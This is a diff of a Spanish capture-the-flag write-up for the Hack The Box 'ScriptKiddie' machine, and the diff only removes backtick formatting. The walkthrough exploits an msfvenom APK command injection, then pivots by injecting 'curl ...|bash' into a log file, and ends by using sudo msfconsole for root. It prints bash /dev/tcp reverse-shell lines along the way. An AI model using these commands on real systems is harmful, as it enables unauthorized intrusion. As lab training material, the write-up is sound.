@@ -30,13 +30,13 @@ image:
 
 ## Descripción
 
-`ScriptKiddie` es una máquina `easy linux`, accedemos a la máquina a través de `explotar` una `vulnerabilidad` en `msfvenom`. Una vez dentro nos `aprovechamos` de un script de otro usuario de la máquina para `pivotar` a ese usuario, este nuevo usuario puede ejecutar `msfconsole` con `sudo`, lo cual usamos para `convertirnos` en `root`
+ScriptKiddie es una máquina easy linux, accedemos a la máquina a través de explotar una vulnerabilidad en msfvenom. Una vez dentro nos aprovechamos de un script de otro usuario de la máquina para pivotar a ese usuario, este nuevo usuario puede ejecutar msfconsole con sudo, lo cual usamos para convertirnos en root
 
 ---
 
 ## Reconocimiento
 
-Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
+Se comprueba que la máquina está activa y se determina su sistema operativo, el ttl de las máquinas linux suele ser 64, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
 
 ```
 # ping 10.129.95.150                           
@@ -52,7 +52,7 @@ rtt min/avg/max/mdev = 57.165/83.802/126.073/30.225 ms
 
 ### Nmap
 
-Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`
+Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap
 
 ```
 # sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.95.150 -oG openPorts 
@@ -75,7 +75,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.70 seconds
            Raw packets sent: 66532 (2.927MB) | Rcvd: 66534 (2.661MB)
 ```
 
-Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados
+Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados
 
 ```
 # nmap -sCV -p10.129.95.150 10.129.95.150 -oN services                                   
@@ -105,11 +105,11 @@ Nmap done: 1 IP address (1 host up) scanned in 11.96 seconds
 
 ### Web Enumeration
 
-Si accedemos a `http://10.129.95.150:5000/` vemos lo siguiente
+Si accedemos a http://10.129.95.150:5000/ vemos lo siguiente
 
 ![](/assets/img/ScriptKiddie/image_1.png)
 
-He buscados por `exploits` de `msfvenom` y he encontrado una `inyección de comandos`
+He buscados por exploits de msfvenom y he encontrado una inyección de comandos
 
 ```
 # searchsploit msfvenom     
@@ -121,7 +121,7 @@ Metasploit Framework 6.0.11 - msfvenom APK template command injection           
 Shellcodes: No Results
 ```
 
-`Inspeccionamos` el `código` para ver como se explota y vemos que hay que `generar` una `apk maliciosa`
+Inspeccionamos el código para ver como se explota y vemos que hay que generar una apk maliciosa
 
 ```
 # searchsploit -x multiple/local/49491.py
@@ -130,23 +130,23 @@ print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.
 
 ## Web Exploitation
 
-Nos ponemos en `escucha` en `netcat`
+Nos ponemos en escucha en netcat
 
 ```
 # nc -nlvp 4444
 ```
 
-`Creamos` un `payload`
+Creamos un payload
 
 ```
 # msfvenom -x shell.apk -p android/shell/reverse_tcp LHOST=10.10.16.23 LPORT=4444 -o /dev/null
 ```
 
-`Subimos` el `payload` y pulsamos en `generate`
+Subimos el payload y pulsamos en generate
 
 ![](/assets/img/ScriptKiddie/image_2.png)
 
-`Recibimos` la `shell`, una vez en la máquina víctima vamos a realizar un `tratamiento` a la `TTY`
+Recibimos la shell, una vez en la máquina víctima vamos a realizar un tratamiento a la TTY
 
 ```
 # nc -nlvp 4444
@@ -157,14 +157,14 @@ $ whoami
 kid
 ```
 
-Obtenemos las `dimensiones` de nuestra `pantalla` 
+Obtenemos las dimensiones de nuestra pantalla 
 
 ```
 # stty size
 45 183
 ```
 
-Efectuamos el `tratamiento` a la `TTY`
+Efectuamos el tratamiento a la TTY
 
 ```
 # script /dev/null -c bash
@@ -184,7 +184,7 @@ Efectuamos el `tratamiento` a la `TTY`
 
 ## Privilege Escalation
 
-En la ruta `/home/kid/html` he encontrado el archivo `app.py`
+En la ruta /home/kid/html he encontrado el archivo app.py
 
 ```
 def searchsploit(text, srcip):
@@ -197,7 +197,7 @@ def searchsploit(text, srcip):
         return render_template('index.html', sserror="stop hacking me - well hack you back")
 ```
 
-También he encontrado este `script`
+También he encontrado este script
 
 ```
 kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
@@ -213,7 +213,7 @@ done
 if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
 ```
 
-`Obtenemos` el `formato` de la `fecha` para introducirlo en el archivo `log`
+Obtenemos el formato de la fecha para introducirlo en el archivo log
 
 ```
 # python
@@ -224,19 +224,19 @@ Type "help", "copyright", "credits" or "license" for more information.
 [2024-08-11 12:13:26.394001]
 ```
 
-Nos ponemos en `escucha` en nuestro equipo
+Nos ponemos en escucha en nuestro equipo
 
 ```
 # sudo tcpdump -i tun0         
 ```
 
-`Metemos` el `contenido` en el `archivo` en el `formato correcto`
+Metemos el contenido en el archivo en el formato correcto
 
 ```
 kid@scriptkiddie:~/logs$ echo '[2024-08-11 12:13:26.394001] 10.10.16.23' > hackers
 ```
 
-`Recibimos` las `peticiones` de la máquina víctima
+Recibimos las peticiones de la máquina víctima
 
 ```
 # sudo tcpdump -i tun0         
@@ -253,7 +253,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 12:16:27.027521 IP 10.10.16.23.4444 > 10.129.95.150.44388: Flags [.], ack 7, win 249, options [nop,nop,TS val 2143336669 ecr 877302068], length 0
 ```
 
-Estamos `recibiendo` estas `peticiones` porque nos está haciendo un `escaneo` con `nmap`, esto lo podemos ver en esta parte del `código` del archivo `app.py`
+Estamos recibiendo estas peticiones porque nos está haciendo un escaneo con nmap, esto lo podemos ver en esta parte del código del archivo app.py
 
 ```
 def scan(ip):
@@ -269,31 +269,31 @@ t blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanne
     return render_template('index.html', scanerror="invalid ip")
 ```
 
-Nos ponemos en `escucha` con `netcat` para recibir una shell
+Nos ponemos en escucha con netcat para recibir una shell
 
 ```
 # nc -nlvp 4444
 ```
 
-Nos `creamos` un `archivo` llamado `shell` con este `contenido`
+Nos creamos un archivo llamado shell con este contenido
 
 ```
 bash -i >& /dev/tcp/10.10.16.23/4444 0>&1
 ```
 
-En el `mismo directorio` donde se encuentra el archivo `shell` nos `montamos` un `servidor` http con python
+En el mismo directorio donde se encuentra el archivo shell nos montamos un servidor http con python
 
 ```
 # python -m http.server 80
 ```
 
-`Modificamos` el `archivo` que se aloja en `/home/kid/logs/hackers` con el objetivo de `ejecutar comandos`
+Modificamos el archivo que se aloja en /home/kid/logs/hackers con el objetivo de ejecutar comandos
 
 ```
 kid@scriptkiddie:~/logs$ echo '[2024-08-11 12:13:26.394001] 10.10.16.23; curl http://10.10.16.23/shell|bash #' > hackers
 ```
 
-`Recibimos` la `shell`
+Recibimos la shell
 
 ```
 # nc -nlvp 4444
@@ -306,7 +306,7 @@ whoami
 pwn
 ```
 
-Como el usuario `pwn` podemos `ejecutar metasploit` como `root`
+Como el usuario pwn podemos ejecutar metasploit como root
 
 ```
 pwn@scriptkiddie:~$ sudo -l
@@ -317,7 +317,7 @@ User pwn may run the following commands on scriptkiddie:
     (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
 ```
 
-Nos `convertimos` en usuario `root`, en `gtfobins` [https://gtfobins.github.io/gtfobins/msfconsole/](https://gtfobins.github.io/gtfobins/msfconsole/) nos explica la forma de hacerlo
+Nos convertimos en usuario root, en gtfobins [https://gtfobins.github.io/gtfobins/msfconsole/](https://gtfobins.github.io/gtfobins/msfconsole/) nos explica la forma de hacerlo
 
 ```
 pwn@scriptkiddie:~$ sudo msfconsole
